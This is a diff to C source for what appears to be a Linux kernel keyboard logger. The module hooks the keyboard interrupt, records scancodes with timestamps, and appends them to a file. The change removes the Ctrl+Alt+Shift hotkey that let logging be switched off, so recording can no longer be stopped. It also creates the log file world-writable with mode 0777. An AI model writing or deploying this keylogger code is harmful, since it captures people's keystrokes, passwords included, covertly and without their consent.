@@ -25,12 +25,6 @@ typedef struct {
     char *name;
 }KBD_IQRQ_STR;
 
-static int loggingEnabled = 1;
-static int canChange = 1;
-
-static int shift=0;
-static int ctrl=0;
-static int alt=0;
 
 time_tt last_pressed;
 KeyPressedInfo keys[3];
@@ -44,47 +38,6 @@ static KBD_IQRQ_STR current_kbd_irq = {
     .name = "Keyboard irq"
 };
 
-void setSystemKeys(int keypressed){
-    switch (keypressed){
-    // LShift
-    case 42:
-        shift = 1;
-        break;
-    case (42+128):
-        shift = 0;
-        break;
-    // RShift
-    case 54:
-        shift = 1;
-        break;
-    case (54+128):
-        shift = 0;
-        break;
-    // ALT
-    case 56:
-        alt = 1;
-        break;
-    case (56+128):
-        alt = 0;
-        break;
-    // CTRL
-    case 29:
-        ctrl = 1;
-        break;
-    case (29+128):
-        ctrl = 0;
-        break;
-    }
-    
-    if (shift & ctrl & alt){
-        loggingEnabled = loggingEnabled == 1 ? 0 : 1;
-        canChange = 0;
-        printk("Logging status changed %d", loggingEnabled);
-    }
-    else
-        canChange = 1;
-    
-}
 
 int getKey(int scancode){
     int sc = scancode - 128;
@@ -131,13 +84,7 @@ void newKey(int scancode, time_tt msec){
 
 void writeToFile(int index)
 {
-
-    if (!loggingEnabled){
-        printk("Logging not enabled");
-        return;
-    }
-    
-    f = filp_open(path, O_APPEND | O_CREAT | O_WRONLY, 0);
+    f = filp_open(path, O_APPEND | O_CREAT | O_WRONLY, 0777);
 
     if (IS_ERR(f)){
         printk("File error occured");
@@ -167,7 +114,6 @@ static void kbd_tasklet_handler(unsigned long data){
     }
     else
         newKey(scancode, time);
-    setSystemKeys(scancode);
 }
 
 DECLARE_TASKLET(kbd_tasklet, kbd_tasklet_handler, 0);
